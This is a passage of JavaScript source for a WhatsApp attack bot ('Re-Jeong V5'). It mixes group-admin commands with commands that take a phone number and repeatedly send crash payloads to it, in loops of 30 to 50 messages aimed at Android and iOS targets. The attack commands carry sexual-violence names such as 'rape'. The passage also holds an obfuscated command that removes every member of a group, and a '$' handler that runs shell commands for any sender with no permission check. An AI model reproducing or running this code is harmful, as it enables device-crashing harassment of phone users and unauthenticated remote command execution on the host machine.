let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
rjng.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot is not Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rjng.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot is not Admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rjng.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot is not Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rjng.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break


case 'romance': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27××× (When horny)`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(rjng, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(rjng, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(rjng, target, wanted)
}
reply(`Kiss kiss  : ${target} lets make a baby`)
break

case 'kiss':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(rjng, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(rjng, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(rjng, target, wanted)
}
reply(`Come  : ${target} lemme kiss you`)
break

case 'fuck':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(rjng, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(rjng, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(rjng, target, wanted)
}
reply(`Andro Andro😎  : ${target} was fucked`)
break

case 'rape':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(rjng, target, "p", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(rjng, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(rjng, target, wanted)
}
reply(`Iphone Iphone 😎  : ${target} was raped`)
break

case '😘':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(rjng, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(rjng, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(rjng, target, wanted)
}
reply(`Kiss kiss  : ${target} `)
break


case 'self': {
if (!isOwner) return reply(mess.only.owner)
rjng.public = false
reply('Succes Mode Private')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Example ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await rjng.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Number not valid!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`User ${prrkek} is now premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Example ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`User ${ya} is nolonger  premium !`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.owner)
rjng.public = true
reply('Succes Mode Public')
}
break


case 'rejeong-bug': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
						highlight_label: " 𝑨𝒏𝒅𝒓𝒐 ",
						rows: [{
							title: 'Fuck ANDRO😂💀',
							id: `fuck ${target}`
						}]
					},
					{
						highlight_label: " 𝑨𝒏𝒅𝒓𝒐 ",
						rows: [{
							title: 'Kill Andro',
							id: `fuck ${target}`
						}]
					},
					{
						highlight_label: " 𝑨𝒏𝒅𝒓𝒐 ",
						rows: [{
							title: 'Burst Andro',
							id: `fuck ${target}`
						}]
					},
					{
						title: '⌜ 𝐈𝚯𝐒 ⌟',
						highlight_label: " 𝐀𝐩𝐩𝐥𝐞 ",
						rows: [{
							title: 'Torment Ios😂',
							id: `rape ${target}`
						}]
					},
					{
						highlight_label: " 𝐀𝐩𝐩𝐥𝐞 ",
						rows: [{
							title: 'Rotten apples',
							id: `rape ${target}`
						}]
					},
					{
						highlight_label: " 𝐀𝐩𝐩𝐥𝐞 ",
						rows: [{
							title: 'Bite the apple',
							id: `rape ${target}`
						}]
					},
					{
						title: '⌜ Re-Jeong ⌟',
						highlight_label: " Re-Jeong ",
						rows: [{
							title: 'Romantic touch',
							id: `romance ${target}`
						}]
					},
					{
						highlight_label: " Re-Jeong ",
						rows: [{
							title: 'Re-Jeong kiss',
							id: `kiss ${target}`
						}]
					},
					{
						highlight_label: " Re-Jeong ",
						rows: [{
							title: 'French Kiss',
							id: `😘 ${target}`
						}]
					}]
let listMessage = {
    title: 'Re-Jeong V5', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "0@newsletter",
 newsletterName: 'Powered By Re-Jeong', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rjng.decodeJid(rjng.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: (`Attacking : ${target}`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: "Re-Jeong V5",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/xbug.jpg")}, { upload: rjng.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Re-Jeong V5\",\"url\":\"https://whatsapp.com/channel/0029ValVRdpI1rcfS1rAJq3h\",\"merchant_url\":\"https://whatsapp.com/channel/0029ValVRdpI1rcfS1rAJq3h\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await rjng.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Example ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break

case "kill": case "kickall":
const _0x409dbc=_0x1a95;(function(_0x13296f,_0x1d8f2b){const _0x935a90=_0x1a95,_0x2748e8=_0x13296f();while(!![]){try{const _0x1b5e80=parseInt(_0x935a90(0x95))/0x1+-parseInt(_0x935a90(0x9a))/0x2*(parseInt(_0x935a90(0x90))/0x3)+parseInt(_0x935a90(0x97))/0x4*(-parseInt(_0x935a90(0xa1))/0x5)+-parseInt(_0x935a90(0xa5))/0x6*(parseInt(_0x935a90(0x9f))/0x7)+-parseInt(_0x935a90(0xa8))/0x8*(parseInt(_0x935a90(0x9e))/0x9)+parseInt(_0x935a90(0x94))/0xa*(-parseInt(_0x935a90(0x96))/0xb)+parseInt(_0x935a90(0xa6))/0xc*(parseInt(_0x935a90(0x91))/0xd);if(_0x1b5e80===_0x1d8f2b)break;else _0x2748e8['push'](_0x2748e8['shift']());}catch(_0x1d3c29){_0x2748e8['push'](_0x2748e8['shift']());}}}(_0x302f,0x4ca98));function _0x302f(){const _0x47fb8e=['remove','358690jImMIP','51277YtWegM','77GwLDMO','3796QaODNx','groupParticipantsUpdate','length','761942DMZDOd','\x20group\x20participants\x20in\x20the\x20next\x20second.\x0a\x0aGoodbye\x20Everyone!\x20👋\x0a\x0aTHIS\x20PROCESS\x20CANNOT\x20BE\x20TERMINATED💀!','reply','chat','153XwMvJI','10738EYNDet','user','870TMQIXP','All\x20parameters\x20are\x20configured,\x20and\x20Kick-all\x20has\x20been\x20initialized\x20and\x20confirmed!.\x20Now,\x20rejeong\x20will\x20remove\x20all\x20','filter','sendMessage','822dyXmDW','16642716DACfKI','Done✅.\x20All\x20group\x20participants\x20have\x20been\x20removed.\x20Do\x20not\x20always\x20use\x20this\x20command\x20to\x20avoid\x20Wa\x20bans!','54976kxXpFh','3LvxISI','13avkyVG','map'];_0x302f=function(){return _0x47fb8e;};return _0x302f();}if(!isBotAdmins)throw'I\x20need\x20admin\x20previlleges\x20to\x20execute\x20this\x20command.';if(!isOwner)throw'Only Re-Jeong owner can use this command😲!';function _0x1a95(_0x1bdc54,_0x1d1355){const _0x302f0c=_0x302f();return _0x1a95=function(_0x1a95df,_0x572fc9){_0x1a95df=_0x1a95df-0x90;let _0x113c8c=_0x302f0c[_0x1a95df];return _0x113c8c;},_0x1a95(_0x1bdc54,_0x1d1355);}let rejeong=participants[_0x409dbc(0xa3)](_0x5202af=>_0x5202af['id']!=rjng['decodeJid'](rjng[_0x409dbc(0xa0)]['id']))[_0x409dbc(0x92)](_0x3c0c18=>_0x3c0c18['id']);m[_0x409dbc(0x9c)]('⚠️\x20Initializing\x20Kick-all\x20command💀...'),setTimeout(()=>{const _0x661bcb=_0x409dbc;rjng[_0x661bcb(0xa4)](m[_0x661bcb(0x9d)],{'text':_0x661bcb(0xa2)+rejeong[_0x661bcb(0x99)]+_0x661bcb(0x9b)},{'quoted':m}),setTimeout(()=>{const _0x5c1d7c=_0x661bcb;rjng[_0x5c1d7c(0x98)](m[_0x5c1d7c(0x9d)],rejeong,_0x5c1d7c(0x93)),setTimeout(()=>{const _0x46c32c=_0x5c1d7c;m['reply'](_0x46c32c(0xa7));},0x3e8);},0x3e8);},0x3e8);
break

default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
rjng.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
